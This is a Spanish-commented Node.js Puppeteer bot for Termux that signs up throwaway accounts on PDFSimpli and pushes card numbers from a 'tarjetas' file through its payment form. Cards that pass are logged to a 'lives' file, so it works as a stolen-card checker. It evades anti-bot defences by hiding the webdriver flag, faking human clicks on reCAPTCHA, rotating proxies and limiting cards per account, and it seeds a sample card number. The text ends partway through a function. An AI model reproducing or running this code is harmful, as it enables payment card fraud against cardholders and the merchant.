const puppeteer = require('puppeteer-core');
const fs = require('fs');
const path = require('path');

class BotPDFSimpli {
    constructor() {
        // Configuración de rutas para Termux
        this.rutaPdf = '/sdcard/Download';
        this.archivoTarjetas = '/sdcard/Download/tarjetas.txt';
        this.archivoLives = '/sdcard/Download/lives.txt';
        this.archivoCuentas = '/sdcard/Download/cuentas_pdfsimpli.json';
        this.archivoProxies = '/sdcard/Download/proxies.txt';
        this.archivoLog = '/sdcard/Download/bot_log.txt';
        
        // Estado del bot
        this.browser = null;
        this.page = null;
        this.cuentas = [];
        this.cuentaActual = null;
        this.proxies = [];
        this.proxyActual = null;
        this.ipActual = null;
        
        // Configuración
        this.maxTarjetasPorCuenta = 3;
        this.maxReintentosClic = 20;
        this.tiempoEsperaEntreReintentos = 1000;
        
        // Mapeo de iframes para campos de pago
        this.iframeMapping = {
            cardNumber: null,
            expiry: null,
            cvv: null
        };
        
        // Estadísticas
        this.estadisticas = {
            tarjetasProcesadas: 0,
            tarjetasValidas: 0,
            cuentasUsadas: 0,
            errores: 0,
            recaptchasResueltos: 0,
            recaptchasManuales: 0,
            reintentosClic: 0,
            tiempoEsperaAcumulado: 0
        };

        // Inicialización
        this.cargarProxies();
        this.cargarOGenerarCuentas();
        this.crearArchivosNecesarios();
        this.inicializarLog();
    }

    // SISTEMA DE LOGGING DETALLADO
    inicializarLog() {
        const timestamp = new Date().toISOString();
        const logHeader = `\n\n=== INICIO DE SESIÓN - ${timestamp} ===\n`;
        fs.appendFileSync(this.archivoLog, logHeader, 'utf8');
    }

    async log(mensaje, tipo = 'INFO') {
        const timestamp = new Date().toLocaleTimeString();
        const logLine = `[${timestamp}] [${tipo}] ${mensaje}\n`;
        
        if (tipo === 'ERROR') {
            console.log(`\x1b[91m${mensaje}\x1b[0m`);
        } else if (tipo === 'SUCCESS') {
            console.log(`\x1b[92m${mensaje}\x1b[0m`);
        } else if (tipo === 'WARNING') {
            console.log(`\x1b[93m${mensaje}\x1b[0m`);
        } else {
            console.log(mensaje);
        }
        
        fs.appendFileSync(this.archivoLog, logLine, 'utf8');
    }

    async logError(error, contexto) {
        await this.log(`💥 ERROR en ${contexto}: ${error.message}`, 'ERROR');
        if (this.page) {
            try {
                const url = await this.page.url();
                await this.log(`📍 URL actual: ${url}`, 'ERROR');
            } catch (e) {}
        }
    }

    // CONFIGURACIÓN INICIAL
    crearArchivosNecesarios() {
        try {
            if (!fs.existsSync(this.archivoTarjetas)) {
                fs.writeFileSync(this.archivoTarjetas, "# Formato: numero|mes|año|cvv\n5124013001057531|03|2030|275\n", 'utf8');
                this.log('📁 Archivo de tarjetas creado');
            }
            
            if (!fs.existsSync(this.archivoLives)) {
                fs.writeFileSync(this.archivoLives, "# Tarjetas válidas encontradas\n", 'utf8');
            }
            
            if (!fs.existsSync(this.archivoProxies)) {
                fs.writeFileSync(this.archivoProxies, "# Formato: ip:puerto\n", 'utf8');
            }
        } catch (error) {
            this.log('❌ Error creando archivos necesarios', 'ERROR');
        }
    }

    async delay(ms) {
        this.estadisticas.tiempoEsperaAcumulado += ms;
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // SISTEMA DE REINTENTOS INTELIGENTES
    async ejecutarConReintentos(accion, descripcion, maxReintentos = 3, delayEntreReintentos = 3000) {
        for (let intento = 1; intento <= maxReintentos; intento++) {
            try {
                this.log(`🔄 Ejecutando ${descripcion} [Intento ${intento}/${maxReintentos}]`);
                const resultado = await accion();
                
                if (resultado === true) {
                    this.log(`✅ ${descripcion} exitoso`, 'SUCCESS');
                    return true;
                }
                
                if (resultado === false && intento < maxReintentos) {
                    this.log(`⚠️ ${descripcion} falló, reintentando...`, 'WARNING');
                    await this.delay(delayEntreReintentos);
                    continue;
                }
                
                return resultado;
                
            } catch (error) {
                this.logError(error, `${descripcion} - intento ${intento}`);
                
                if (intento < maxReintentos) {
                    await this.delay(delayEntreReintentos);
                }
            }
        }
        
        this.log(`❌ ${descripcion} falló después de ${maxReintentos} intentos`, 'ERROR');
        return false;
    }

    // SISTEMA DE PROXIES
    cargarProxies() {
        try {
            if (fs.existsSync(this.archivoProxies)) {
                const data = fs.readFileSync(this.archivoProxies, 'utf8');
                const lineas = data.split('\n');
                for (const linea of lineas) {
                    const lineaClean = linea.trim();
                    if (lineaClean && !lineaClean.startsWith('#')) {
                        this.proxies.push(lineaClean);
                    }
                }
                this.log(`✅ ${this.proxies.length} proxies cargados`);
            }
        } catch (error) {
            this.log('⚠️ No se pudieron cargar proxies');
        }
    }

    // SISTEMA DE CUENTAS
    cargarOGenerarCuentas() {
        try {
            if (fs.existsSync(this.archivoCuentas)) {
                const data = JSON.parse(fs.readFileSync(this.archivoCuentas, 'utf8'));
                this.cuentas = data.cuentas || [];
                this.log(`✅ ${this.cuentas.length} cuentas cargadas`);
                
                this.cuentas.forEach(cuenta => {
                    if (cuenta.tarjetasProcesadas === undefined) {
                        cuenta.tarjetasProcesadas = 0;
                    }
                });
            } else {
                this.generarListaCuentas();
                this.guardarCuentas();
                this.log(`✅ ${this.cuentas.length} cuentas generadas`);
            }
        } catch (error) {
            this.generarListaCuentas();
            this.guardarCuentas();
        }
    }

    generarListaCuentas() {
        const nombres = ['juan', 'maria', 'carlos', 'ana', 'luis', 'laura'];
        const apellidos = ['garcia', 'rodriguez', 'gonzalez', 'fernandez', 'lopez'];
        
        this.cuentas = [];
        
        for (let i = 1; i <= 50; i++) {
            const nombre = nombres[Math.floor(Math.random() * nombres.length)];
            const apellido = apellidos[Math.floor(Math.random() * apellidos.length)];
            const numero = Math.floor(10000 + Math.random() * 90000);
            const dominio = Math.random() > 0.5 ? 'gmail.com' : 'outlook.com';
            
            const email = `${nombre}.${apellido}${numero}@${dominio}`;
            const password = `${nombre.charAt(0).toUpperCase() + nombre.slice(1)}${apellido.charAt(0).toUpperCase() + apellido.slice(1)}${Math.floor(100 + Math.random() * 900)}!`;
            
            this.cuentas.push({
                email: email,
                password: password,
                usada: false,
                tarjetasProcesadas: 0,
                fechaCreacion: new Date().toISOString(),
                ultimoUso: null,
                exitosas: 0,
                fallidas: 0
            });
        }
    }

    guardarCuentas() {
        try {
            const data = {
                cuentas: this.cuentas,
                ultimaActualizacion: new Date().toISOString(),
                totalCuentas: this.cuentas.length
            };
            fs.writeFileSync(this.archivoCuentas, JSON.stringify(data, null, 2));
        } catch (error) {
            this.log('❌ Error guardando cuentas', 'ERROR');
        }
    }

    obtenerProximaCuenta() {
        const cuentasDisponibles = this.cuentas.filter(c => 
            !c.usada || c.tarjetasProcesadas < this.maxTarjetasPorCuenta
        );
        
        if (cuentasDisponibles.length === 0) {
            this.log('❌ No hay cuentas disponibles', 'ERROR');
            return null;
        }
        
        // Preferir cuentas no usadas
        const cuentasNoUsadas = cuentasDisponibles.filter(c => !c.usada);
        if (cuentasNoUsadas.length > 0) {
            return cuentasNoUsadas[Math.floor(Math.random() * cuentasNoUsadas.length)];
        }
        
        // Si no hay cuentas no usadas, usar una con menos tarjetas procesadas
        return cuentasDisponibles.sort((a, b) => a.tarjetasProcesadas - b.tarjetasProcesadas)[0];
    }

    // NAVEGADOR
    async iniciarNavegador() {
        return await this.ejecutarConReintentos(async () => {
            this.log('🚀 Iniciando navegador...');
            
            const options = {
                headless: true,
                executablePath: '/data/data/com.termux/files/usr/bin/chromium-browser',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--window-size=1200,800',
                    '--ignore-certificate-errors',
                    '--ignore-ssl-errors',
                    '--disable-web-security',
                    '--disable-blink-features=AutomationControlled',
                    '--headless=new'
                ],
                ignoreHTTPSErrors: true
            };

            this.browser = await puppeteer.launch(options);
            this.page = await this.browser.newPage();
            
            await this.page.setDefaultNavigationTimeout(30000);
            await this.page.setDefaultTimeout(15000);
            await this.page.setViewport({ width: 1200, height: 800 });
            
            await this.page.setUserAgent('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
            
            await this.page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            });

            this.log('✅ Navegador configurado', 'SUCCESS');
            return true;
        }, 'iniciar navegador', 2, 3000);
    }

    // SISTEMA DE CLICS INTELIGENTES - MEJORADO
    async clicInteligente(selectores, descripcion, tiempoEspera = 3000) {
        this.log(`🎯 Buscando: ${descripcion}`);
        
        for (let intento = 1; intento <= this.maxReintentosClic; intento++) {
            try {
                this.log(`🔄 [Intento ${intento}/${this.maxReintentosClic}] Buscando: ${descripcion}`);
                
                for (const selector of selectores) {
                    try {
                        let elemento = null;
                        
                        if (selector.tipo === 'id') {
                            elemento = await this.page.$(selector.valor);
                        } else if (selector.tipo === 'texto') {
                            const elementos = await this.page.$$(selector.elemento || 'button, a, input[type="submit"], span, div');
                            for (const elem of elementos) {
                                try {
                                    const texto = await this.page.evaluate(el => el.textContent?.trim(), elem);
                                    if (texto && texto.toLowerCase().includes(selector.valor.toLowerCase())) {
                                        elemento = elem;
                                        break;
                                    }
                                } catch (e) {
                                    continue;
                                }
                            }
                        }

                        if (elemento) {
                            this.log(`✅ Elemento encontrado: ${selector.tipo} - ${selector.valor}`, 'SUCCESS');
                            
                            // Scroll y clic MEJORADO
                            await elemento.evaluate(el => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
                            await this.delay(1000);
                            
                            // Intentar clic con diferentes métodos
                            try {
                                await elemento.click();
                            } catch (error) {
                                // Si falla el clic normal, usar JavaScript
                                await this.page.evaluate((el) => {
                                    el.click();
                                }, elemento);
                            }
                            
                            this.log(`🎉 Clic exitoso en: ${descripcion}`, 'SUCCESS');
                            await this.delay(tiempoEspera);
                            return true;
                        }
                    } catch (error) {
                        continue;
                    }
                }
                
                await this.delay(this.tiempoEsperaEntreReintentos);
                this.estadisticas.reintentosClic++;
                
            } catch (error) {
                this.logError(error, `intento ${intento} para ${descripcion}`);
                await this.delay(this.tiempoEsperaEntreReintentos);
            }
        }
        
        this.log(`❌ No se pudo hacer clic en: ${descripcion} después de ${this.maxReintentosClic} intentos`, 'ERROR');
        return false;
    }

    // FLUJO PRINCIPAL - SUBIR PDF
    async subirPDF() {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('📁 Buscando PDF...');
                
                const archivos = fs.readdirSync(this.rutaPdf);
                const pdfs = archivos.filter(f => f.toLowerCase().endsWith('.pdf'));
                
                if (pdfs.length === 0) {
                    this.log('❌ No hay PDFs en la carpeta', 'ERROR');
                    return false;
                }

                const pdfPath = path.join(this.rutaPdf, pdfs[0]);
                this.log(`🎯 PDF seleccionado: ${pdfs[0]}`);

                await this.delay(2000);

                const inputFile = await this.page.$('input[type="file"]');
                if (!inputFile) {
                    this.log('❌ No se encontró input file', 'ERROR');
                    return false;
                }

                await inputFile.uploadFile(pdfPath);
                this.log('✅ PDF subido', 'SUCCESS');
                
                await this.delay(5000);
                return true;

            } catch (error) {
                if (error.message.includes('detached')) {
                    this.log('⚠️ Frame detached, reintentando subida...', 'WARNING');
                    await this.delay(3000);
                    return false;
                }
                this.logError(error, 'subirPDF');
                return false;
            }
        }, 'subir PDF', 3, 3000);
    }

    async hacerClicConvert() {
        const selectores = [
            { tipo: 'id', valor: '#ConvertContinue' },
            { tipo: 'texto', valor: 'convert', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'continue', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'convertir', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligente(selectores, 'CONVERTIR PDF', 3000);
    }

    async hacerClicDownload() {
        const selectores = [
            { tipo: 'id', valor: '#congDwnaut' },
            { tipo: 'texto', valor: 'download', elemento: 'button, a, div, input' },
            { tipo: 'texto', valor: 'get file', elemento: 'button, a, div, input' },
            { tipo: 'texto', valor: 'descargar', elemento: 'button, a, div, input' }
        ];
        
        return await this.clicInteligente(selectores, 'DESCARGAR', 3000);
    }

    // SISTEMA DE REGISTRO - CORREGIDO CON RECAPTCHA PROFESIONAL
    async manejarRegistro() {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('👤 Iniciando proceso de registro...');
                await this.delay(3000);

                // FORZAR REGISTRO SIEMPRE para nueva cuenta
                if (!this.cuentaActual) {
                    this.cuentaActual = this.obtenerProximaCuenta();
                    if (!this.cuentaActual) return false;
                }

                this.log(`🔄 Cuenta asignada: ${this.cuentaActual.email}`);

                // Buscar campos de registro de forma más agresiva
                const campos = await this.buscarCamposRegistroCompleto();
                if (!campos) {
                    this.log('❌ No se encontraron campos de registro', 'ERROR');
                    return false;
                }

                this.log('📝 Completando registro...');
                this.log(`📧 Email: ${this.cuentaActual.email}`);
                this.log(`🔑 Password: ${this.cuentaActual.password}`);

                // Completar email
                await campos.email.click({ clickCount: 3 });
                await campos.email.press('Backspace');
                await campos.email.type(this.cuentaActual.email, { delay: 50 });
                await this.delay(1000);

                // Completar password
                await campos.password.click({ clickCount: 3 });
                await campos.password.press('Backspace');
                await campos.password.type(this.cuentaActual.password, { delay: 50 });
                await this.delay(1000);

                this.log('✅ Campos de registro completados', 'SUCCESS');

                // Hacer clic en registro
                if (!await this.hacerClicRegistro()) {
                    return false;
                }

                await this.delay(5000);

                // MANEJAR RECAPTCHA CON MÉTODO PROFESIONAL
                const recaptchaResult = await this.manejarRecaptchaPro();
                if (!recaptchaResult) {
                    this.log('⚠️ No se pudo resolver el reCAPTCHA, continuando...', 'WARNING');
                }

                // CLIC EN CONTINUE DESPUÉS DEL RECAPTCHA
                await this.manejarContinueDespuesRecaptcha();

                await this.delay(3000);

                this.log('✅ Proceso de registro completado', 'SUCCESS');
                return true;

            } catch (error) {
                this.logError(error, 'manejarRegistro');
                return false;
            }
        }, 'manejar registro', 2, 3000);
    }

    // SISTEMA RECAPTCHA PROFESIONAL - ACTUALIZADO
    async manejarRecaptchaPro() {
        try {
            this.log('🎯 Iniciando solución profesional de reCAPTCHA...');

            const resultado = await this.resolverRecaptchaEnFrame();
            
            if (resultado) {
                this.log('✅ reCAPTCHA resuelto exitosamente', 'SUCCESS');
                this.estadisticas.recaptchasResueltos++;
                return true;
            }

            this.log('❌ No se pudo resolver reCAPTCHA automáticamente', 'ERROR');
            return await this.esperarResolucionManual();

        } catch (error) {
            this.logError(error, 'manejarRecaptchaPro');
            return false;
        }
    }

    async resolverRecaptchaEnFrame() {
        try {
            this.log('🔄 Intentando resolver reCAPTCHA...');

            // Selecciona SOLO el iframe correcto
            const iframeAnchor = this.page
                .frames()
                .find(f => f.url().includes("recaptcha/api2/anchor"));

            if (!iframeAnchor) {
                this.log("❌ No se encontró el iframe del checkbox");
                return false;
            }

            // Esperar anchor
            await iframeAnchor.waitForSelector("#recaptcha-anchor", { 
                visible: true, 
                timeout: 10000 
            });

            // Ya está marcado?
            const marcado = await iframeAnchor.$eval("#recaptcha-anchor", el =>
                el.getAttribute("aria-checked") === "true"
            );
            
            if (marcado) {
                this.log("✅ reCAPTCHA ya estaba resuelto");
                return true;
            }

            // CLICK HUMANO REAL
            const anchor = await iframeAnchor.$("#recaptcha-anchor");
            const box = await anchor.boundingBox();

            if (!box) {
                this.log("❌ No se pudo obtener la posición del checkbox");
                return false;
            }

            // Movimiento humano real hacia el checkbox
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(120);

            // Clic humano (presionar y soltar)
            await this.page.mouse.down();
            await this.delay(80);
            await this.page.mouse.up();

            this.log("🖱️ Click humano enviado!");

            await this.delay(2000);

            // Verificar si ya está resuelto
            const resolved = await iframeAnchor.$eval("#recaptcha-anchor", el =>
                el.getAttribute("aria-checked") === "true"
            );

            return resolved;

        } catch (err) {
            this.logError(err, 'resolverRecaptchaEnFrame');
            return false;
        }
    }

    async esperarResolucionManual() {
        try {
            this.log('⏳ Esperando resolución manual del reCAPTCHA (10 segundos)...');
            this.estadisticas.recaptchasManuales++;
            
            const startTime = Date.now();
            while (Date.now() - startTime < 10000) {
                const iframeAnchor = this.page.frames().find(f => f.url().includes("recaptcha/api2/anchor"));
                if (iframeAnchor) {
                    const resuelto = await iframeAnchor.$eval("#recaptcha-anchor", el =>
                        el.getAttribute("aria-checked") === "true"
                    );
                    if (resuelto) {
                        this.log('✅ reCAPTCHA resuelto manualmente');
                        return true;
                    }
                }
                await this.delay(2000);
            }
            
            this.log('❌ Tiempo agotado para resolución manual');
            return false;
            
        } catch (error) {
            this.logError(error, 'esperarResolucionManual');
            return false;
        }
    }

    async manejarContinueDespuesRecaptcha() {
        try {
            this.log('🔄 Buscando botón CONTINUE después del reCAPTCHA...');
            await this.delay(3000);

            // Buscar botón por ID específico
            const botonContinue = await this.page.$('#planPageContinueButton');
            if (botonContinue) {
                const box = await botonContinue.boundingBox();
                if (box) {
                    // Clic humano en el botón continue
                    await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                    await this.delay(100);
                    await this.page.mouse.down();
                    await this.delay(50);
                    await this.page.mouse.up();
                    
                    this.log("✅ Clic REAL en botón CONTINUE");
                    await this.delay(2000);
                    return true;
                }
            }

            // Búsqueda alternativa por texto
            const botones = await this.page.$$('button, input[type="submit"]');
            for (const boton of botones) {
                try {
                    const texto = await this.page.evaluate(el => el.textContent || el.value || '', boton);
                    const textoLower = texto.toLowerCase().trim();
                    
                    if (textoLower.includes('continue') || textoLower.includes('continuar')) {
                        const box = await boton.boundingBox();
                        if (box) {
                            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                            await this.delay(100);
                            await this.page.mouse.down();
                            await this.delay(50);
                            await this.page.mouse.up();
                            
                            this.log("✅ Clic REAL en botón por texto");
                            await this.delay(2000);
                            return true;
                        }
                    }
                } catch (error) {
                    continue;
                }
            }

            this.log('⚠️ No se encontró botón CONTINUE, continuando...');
            return true;

        } catch (error) {
            this.logError(error, 'manejarContinueDespuesRecaptcha');
            return false;
        }
    }

    async buscarCamposRegistroCompleto() {
        try {
            this.log('🔍 Búsqueda exhaustiva de campos de registro...');
            
            // Estrategia 1: Buscar por tipos específicos
            let campoEmail = await this.page.$('input[type="email"]');
            let campoPassword = await this.page.$('input[type="password"]');
            
            // Estrategia 2: Buscar por name
            if (!campoEmail) campoEmail = await this.page.$('input[name="email"], input[name="username"], input[name="user"]');
            if (!campoPassword) campoPassword = await this.page.$('input[name="password"], input[name="pass"], input[name="pwd"]');
            
            // Estrategia 3: Buscar por placeholder
            if (!campoEmail) {
                const inputs = await this.page.$$('input');
                for (const input of inputs) {
                    const placeholder = await input.evaluate(el => el.placeholder);
                    if (placeholder && (placeholder.toLowerCase().includes('email') || placeholder.toLowerCase().includes('correo') || placeholder.toLowerCase().includes('username'))) {
                        campoEmail = input;
                        break;
                    }
                }
            }
            
            if (!campoPassword) {
                const inputs = await this.page.$$('input');
                for (const input of inputs) {
                    const placeholder = await input.evaluate(el => el.placeholder);
                    if (placeholder && (placeholder.toLowerCase().includes('password') || placeholder.toLowerCase().includes('contraseña') || placeholder.toLowerCase().includes('pass'))) {
                        campoPassword = input;
                        break;
                    }
                }
            }

            // Estrategia 4: Buscar por ID
            if (!campoEmail) campoEmail = await this.page.$('#email, #username, #user, #login');
            if (!campoPassword) campoPassword = await this.page.$('#password, #pass, #pwd, #login-password');
            
            if (campoEmail && campoPassword) {
                this.log('✅ Campos de registro encontrados', 'SUCCESS');
                return { email: campoEmail, password: campoPassword };
            }
            
            this.log('❌ No se pudieron encontrar ambos campos de registro');
            return null;
            
        } catch (error) {
            this.logError(error, 'buscarCamposRegistroCompleto');
            return null;
        }
    }

    async hacerClicRegistro() {
        const selectores = [
            { tipo: 'id', valor: '#sign-up' },
            { tipo: 'texto', valor: 'sign up', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'register', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'crear cuenta', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'registrarse', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'signup', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'join', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligente(selectores, 'BOTÓN REGISTRO', 3000);
    }

    // SISTEMA DE IFRAMES - COMPLETAMENTE REESCRITO
    async esperarIframesCargados() {
        this.log('🔄 Esperando iframes de pago...');
        
        const timeout = 15000;
        const startTime = Date.now();
        
        // Reset mapping
        this.iframeMapping = { cardNumber: null, expiry: null, cvv: null };
        
        while (Date.now() - startTime < timeout) {
            const frames = this.page.frames();
            
            for (let i = 0; i < frames.length; i++) {
                const frame = frames[i];
                
                try {
                    // Verificar si el frame tiene contenido relevante
                    const body = await frame.$('body');
                    if (!body) continue;
                    
                    // Buscar inputs específicos en cada frame
                    const inputs = await frame.$$('input');
                    
                    for (const input of inputs) {
                        const inputType = await input.evaluate(el => el.type);
                        const inputName = await input.evaluate(el => el.name);
                        const placeholder = await input.evaluate(el => el.placeholder);
                        const maxLength = await input.evaluate(el => el.maxLength);
                        const id = await input.evaluate(el => el.id);
                        
                        // Identificar por múltiples criterios
                        if ((inputType === 'text' && maxLength >= 16) || 
                            (placeholder && placeholder.toLowerCase().includes('card')) ||
                            (inputName && inputName.toLowerCase().includes('card')) ||
                            (id && id.toLowerCase().includes('card'))) {
                            this.iframeMapping.cardNumber = frame;
                            this.log(`✅ Iframe número tarjeta encontrado en frame ${i}`, 'SUCCESS');
                        }
                        
                        if (maxLength === 3 || maxLength === 4 || 
                            (placeholder && placeholder.toLowerCase().includes('cvv')) ||
                            (inputName && inputName.toLowerCase().includes('cvv')) ||
                            (id && id.toLowerCase().includes('cvv'))) {
                            this.iframeMapping.cvv = frame;
                            this.log(`✅ Iframe CVV encontrado en frame ${i}`, 'SUCCESS');
                        }
                    }
                    
                    // Buscar selects para fecha
                    const selects = await frame.$$('select');
                    if (selects.length >= 2) {
                        this.iframeMapping.expiry = frame;
                        this.log(`✅ Iframe fecha encontrado en frame ${i}`, 'SUCCESS');
                    }
                    
                } catch (error) {
                    continue;
                }
            }
            
            // Verificar si tenemos los iframes necesarios
            if (this.iframeMapping.cardNumber && this.iframeMapping.cvv) {
                this.log('✅ Iframes de pago cargados correctamente', 'SUCCESS');
                return true;
            }
            
            await this.delay(1000);
        }
        
        this.log('⚠️ No se encontraron todos los iframes necesarios', 'WARNING');
        return this.iframeMapping.cardNumber !== null;
    }

    // COMPLETAR CAMPOS CON ESTRATEGIA MEJORADA
    async completarInformacionPago(tarjeta) {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('💳 Iniciando proceso de pago...');

                // Estrategia 1: Usar iframes
                await this.esperarIframesCargados();
                
                let camposCompletados = 0;
                const camposRequeridos = [];

                // Completar número de tarjeta
                if (await this.completarCampoConEstrategiaMixta('numero', tarjeta.numero)) {
                    camposCompletados++;
                    camposRequeridos.push('numero');
                }

                // Completar fecha - ESTRATEGIA MEJORADA
                if (await this.completarFechaExpiracionMejorado(tarjeta)) {
                    camposCompletados++;
                    camposRequeridos.push('fecha');
                }

                // Completar CVV
                if (await this.completarCampoConEstrategiaMixta('cvv', tarjeta.cvv)) {
                    camposCompletados++;
                    camposRequeridos.push('cvv');
                }

                // Completar nombre
                if (await this.completarNombreTitular()) {
                    camposCompletados++;
                    camposRequeridos.push('nombre');
                }

                // Marcar términos
                if (await this.marcarCheckboxSeguro()) {
                    camposCompletados++;
                    camposRequeridos.push('terminos');
                }

                this.log(`📊 Campos completados: ${camposCompletados}/5 - ${camposRequeridos.join(', ')}`);

                // Requerir número, fecha y CVV como mínimo
                return camposRequeridos.includes('numero') && 
                       camposRequeridos.includes('cvv') && 
                       camposCompletados >= 3;

            } catch (error) {
                this.logError(error, 'completarInformacionPago');
                return false;
            }
        }, 'completar información de pago', 2, 3000);
    }

    async completarCampoConEstrategiaMixta(tipo, valor) {
        try {
            this.log(`🔍 Completando ${tipo} con estrategia mixta...`);
            
            // Estrategia 1: Usar iframe mapeado
            if (tipo === 'numero' && this.iframeMapping.cardNumber) {
                const resultado = await this.completarCampoEnIframe(this.iframeMapping.cardNumber, valor, 'número de tarjeta');
                if (resultado) return true;
            }
            
            if (tipo === 'cvv' && this.iframeMapping.cvv) {
                const resultado = await this.completarCampoEnIframe(this.iframeMapping.cvv, valor, 'CVV');
                if (resultado) return true;
            }
            
            // Estrategia 2: Buscar en página principal
            const selectores = tipo === 'numero' ? [
                'input[placeholder*="card" i]',
                'input[placeholder*="number" i]',
                'input[name*="card" i]',
                'input[type="text"][maxlength="16"]',
                'input[type="text"][maxlength="19"]',
                'input[id*="card" i]',
                '#card-number',
                '#number'
            ] : [
                'input[placeholder*="cvv" i]',
                'input[placeholder*="security" i]',
                'input[name*="cvv" i]',
                'input[type="text"][maxlength="3"]',
                'input[type="text"][maxlength="4"]',
                'input[type="password"][maxlength="3"]',
                'input[id*="cvv" i]',
                '#cvv',
                '#security'
            ];
            
            for (const selector of selectores) {
                const campo = await this.page.$(selector);
                if (campo) {
                    await this.completarCampoSeguro(campo, valor);
                    this.log(`✅ ${tipo} completado en página principal`, 'SUCCESS');
                    return true;
                }
            }
            
            this.log(`❌ No se pudo completar ${tipo}`);
            return false;
            
        } catch (error) {
            this.logError(error, `completarCampoConEstrategiaMixta ${tipo}`);
            return false;
        }
    }

    async completarCampoEnIframe(frame, valor, descripcion) {
        try {
            const inputs = await frame.$$('input');
            
            for (const input of inputs) {
                try {
                    // Limpiar y escribir usando JavaScript
                    await frame.evaluate((input, valor) => {
                        input.value = '';
                        input.focus();
                        input.value = valor;
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                    }, input, valor);
                    
                    this.log(`✅ ${descripcion} completado en iframe`, 'SUCCESS');
                    return true;
                    
                } catch (error) {
                    continue;
                }
            }
            
            return false;
        } catch (error) {
            this.logError(error, `completarCampoEnIframe ${descripcion}`);
            return false;
        }
    }

    async completarCampoSeguro(campo, valor) {
        try {
            await this.page.evaluate((campo, valor) => {
                campo.value = '';
                campo.focus();
                campo.value = valor;
                campo.dispatchEvent(new Event('input', { bubbles: true }));
                campo.dispatchEvent(new Event('change', { bubbles: true }));
            }, campo, valor);
            
            return true;
        } catch (error) {
            this.logError(error, 'completarCampoSeguro');
            return false;
        }
    }

    // COMPLETAR FECHA MEJORADO
    async completarFechaExpiracionMejorado(tarjeta) {
        try {
            this.log('📅 Completando fecha de expiración (método mejorado)...');
            
            let completados = 0;
            
            // Estrategia 1: Buscar en iframe de fecha
            if (this.iframeMapping.expiry) {
                const frame = this.iframeMapping.expiry;
                const selects = await frame.$$('select');
                
                if (selects.length >= 2) {
                    // Asumir que el primero es mes y el segundo es año
                    await selects[0].select(tarjeta.mes.padStart(2, '0'));
                    completados++;
                    
                    const anioCompleto = tarjeta.anio.length === 2 ? `20${tarjeta.anio}` : tarjeta.anio;
                    await selects[1].select(anioCompleto);
                    completados++;
                }
            }
            
            // Estrategia 2: Buscar en página principal
            if (completados < 2) {
                const selectoresMes = [
                    'select[name*="month"]',
                    'select[name*="mes"]',
                    'select[id*="month"]',
                    'select[name*="expire"]',
                    '#exp-month',
                    '#month'
                ];
                
                const selectoresAnio = [
                    'select[name*="year"]',
                    'select[name*="año"]',
                    'select[id*="year"]',
                    'select[name*="expire"]',
                    '#exp-year',
                    '#year'
                ];
                
                for (const selector of selectoresMes) {
                    const select = await this.page.$(selector);
                    if (select) {
                        await select.select(tarjeta.mes.padStart(2, '0'));
                        completados++;
                        break;
                    }
                }
                
                for (const selector of selectoresAnio) {
                    const select = await this.page.$(selector);
                    if (select) {
                        const anioCompleto = tarjeta.anio.length === 2 ? `20${tarjeta.anio}` : tarjeta.anio;
                        await select.select(anioCompleto);
                        completados++;
                        break;
                    }
                }
            }
            
            // Estrategia 3: Buscar inputs de texto para fecha
            if (completados < 2) {
                const inputFecha = await this.page.$('input[placeholder*="MM/YY"], input[name*="expire"], input[placeholder*="MM/YYYY"]');
                if (inputFecha) {
                    const fecha = `${tarjeta.mes.padStart(2, '0')}/${tarjeta.anio}`;
                    await this.completarCampoSeguro(inputFecha, fecha);
                    completados += 2;
                }
            }
            
            if (completados >= 1) {
                this.log(`✅ Fecha completada (${completados}/2 campos)`, 'SUCCESS');
                return true;
            }
            
            this.log('❌ No se pudo completar la fecha');
            return false;
            
        } catch (error) {
            this.logError(error, 'completarFechaExpiracionMejorado');
            return false;
        }
    }

    async completarNombreTitular() {
        try {
            this.log('👤 Buscando campo nombre del titular...');
            
            const nombre = this.generarNombreAleatorio();
            const selectores = [
                'input[name*="name" i]',
                'input[placeholder*="name" i]',
                'input[placeholder*="nombre" i]',
                'input[name*="holder" i]',
                'input[id*="name" i]',
                '#cardholder',
                '#name'
            ];
            
            for (const selector of selectores) {
                const campo = await this.page.$(selector);
                if (campo) {
                    await this.completarCampoSeguro(campo, nombre);
                    this.log(`✅ Nombre completado: ${nombre}`, 'SUCCESS');
                    return true;
                }
            }
            
            this.log('⚠️ No se encontró campo para nombre');
            return false;
            
        } catch (error) {
            this.logError(error, 'completarNombreTitular');
            return false;
        }
    }

    async marcarCheckboxSeguro() {
        try {
            this.log('✅ Buscando checkbox de términos...');
            
            const checkboxes = await this.page.$$('input[type="checkbox"]');
            for (const checkbox of checkboxes) {
                try {
                    const estaMarcado = await checkbox.evaluate(el => el.checked);
                    if (!estaMarcado) {
                        await checkbox.click();
                        this.log('✅ Términos aceptados', 'SUCCESS');
                        return true;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            this.log('⚠️ No se encontró checkbox de términos o ya estaban marcados');
            return true;
            
        } catch (error) {
            this.logError(error, 'marcarCheckboxSeguro');
